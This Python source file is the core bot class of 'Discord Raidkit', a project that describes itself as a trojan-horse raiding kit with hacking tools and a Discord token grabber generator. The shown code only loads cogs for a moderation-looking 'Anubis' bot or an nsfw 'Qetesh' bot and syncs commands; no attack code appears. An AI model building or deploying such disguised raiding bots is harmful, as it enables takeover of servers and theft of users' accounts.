'''
Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
Copyright © 2022 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

raidkit.py stores the class responsible for running raidkits.
raidkit.py was last updated on 11/08/22 at 17:44.
'''

import aiohttp
import discord
from discord.ext import commands

from display import show_main_raidkit, show_sync_msg


class Raidkit(commands.Bot):
    """A class to handle the running of Raidkits.
    Anubis has a raidkit_id of 1.
    Qetesh has a raidkit_id of 2.
    """

    def __init__(self, raidkit_id, prefix, app_id, theme) -> None:
        super().__init__(command_prefix=prefix, intents=discord.Intents.all(),
                         application_id=app_id)
        self.raidkit_id = raidkit_id
        self.session = aiohttp.ClientSession()
        self.theme = theme
        self.prefix = prefix
        self.remove_command('help')
        return

    async def setup_hook(self) -> None:

        if self.raidkit_id == 1:
            self.initial_extensions = [
                'cogs.anubis.moderation',
                'cogs.anubis.raid_prevention',
                'cogs.anubis.surfing',
                'cogs.anubis.ahelp',
                'cogs.shared.cmds',
                'cogs.shared.handler']
        elif self.raidkit_id == 2:
            self.initial_extensions = [
                'cogs.qetesh.nsfw',
                'cogs.qetesh.qhelp',
                'cogs.shared.cmds',
                'cogs.shared.handler']

        for ext in self.initial_extensions:
            await self.load_extension(ext)

        return

    async def close(self) -> None:
        await super().close()
        await self.session.close()
        return

    async def on_ready(self) -> None:
        show_sync_msg(self.theme)
        await self.tree.sync()
        show_main_raidkit(self.theme, self.prefix)
        return

    async def on_guild_join(self, guild: discord.Guild) -> None:
        await self.tree.sync(guild=guild)
        return
